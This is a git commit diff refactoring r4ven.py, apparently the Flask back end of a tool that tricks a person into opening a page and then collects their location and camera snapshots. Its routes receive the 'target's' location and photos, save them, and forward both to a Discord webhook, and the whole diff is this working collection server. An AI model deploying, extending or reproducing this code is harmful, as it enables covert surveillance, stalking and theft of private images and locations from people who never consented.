78fc3f9f2377d6283f57e5a3795832e73c7cdda2
Preston Zen <36439263+prestonzen@users.noreply.github.com>
2024-02-26 00:26:56 +0700

    Fullstack Sync

--- r4ven.py
+++ r4ven.py
@@ -5,63 +5,45 @@ import requests
 from flask import Flask, request, Response
 import time
 
-# Using environment variables with defaults if not set
+# Environment variables setup
 TARGET_URL = os.getenv('TARGET_URL', 'http://localhost:8000/image')
 PORT = int(os.getenv('PORT', '8000'))
 DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL', '')
+
+app = Flask(__name__)
 
 if not os.path.exists('image'):
     print(f"Creating image directory at {os.getcwd()}/image")
     os.mkdir('image')
 PATH_TO_IMAGES_DIR = os.path.join(os.getcwd(), 'image')
 
-HTML_FILE_NAME = "index.html"
-app = Flask(__name__)
-
-def get_file_data(file_path):
-    """
-    Gets the file data
-    """
-    with open(file_path, 'r') as open_file:
-        return open_file.read()
-
-def update_webhook(webhook: str, webhook_data: dict):
-    """
-    Sends a post request to the given webhook
-    """
-    request_payload = json.dumps(webhook_data)
-    headers = {'Content-Type': 'application/json'}
-    requests.post(webhook, headers=headers, data=request_payload)
-
 @app.route("/", methods=["GET"])
 def get_website():
-    try:
-        html_data = get_file_data(HTML_FILE_NAME)
-        return Response(html_data, content_type="text/html")
-    except FileNotFoundError:
-        return "HTML file not found", 404
+    # Simplified to serve a static HTML file, ensure 'index.html' is in your working directory
+    return app.send_static_file('index.html')
 
 @app.route("/location_update", methods=["POST"])
 def update_location():
     data = request.json
-    update_webhook(DISCORD_WEBHOOK_URL, data)
+    if DISCORD_WEBHOOK_URL:
+        headers = {'Content-Type': 'application/json'}
+        response = requests.post(DISCORD_WEBHOOK_URL, headers=headers, json=data)
+        print(response.text)  # For debugging
     return "OK"
 
 @app.route('/image', methods=['POST'])
 def image():
     img_file = request.files['image']
-    filename = ('%s.jpeg' % time.strftime("%Y%m%d-%H%M%S"))
+    filename = f'{time.strftime("%Y%m%d-%H%M%S")}.jpeg'
     img_file.save(os.path.join(PATH_TO_IMAGES_DIR, filename))
     print(f"Picture of the target captured and saved as {filename}")
 
-    # Send the image to the Discord webhook
     if DISCORD_WEBHOOK_URL:
         files = {'image': open(os.path.join(PATH_TO_IMAGES_DIR, filename), 'rb')}
         requests.post(DISCORD_WEBHOOK_URL, files=files)
     return Response(f"{filename} saved and potentially sent to Discord webhook")
 
 def main():
-    print(f"Server running on port {PORT}")
     app.run(debug=False, host="0.0.0.0", port=PORT)
 
 if __name__ == "__main__":
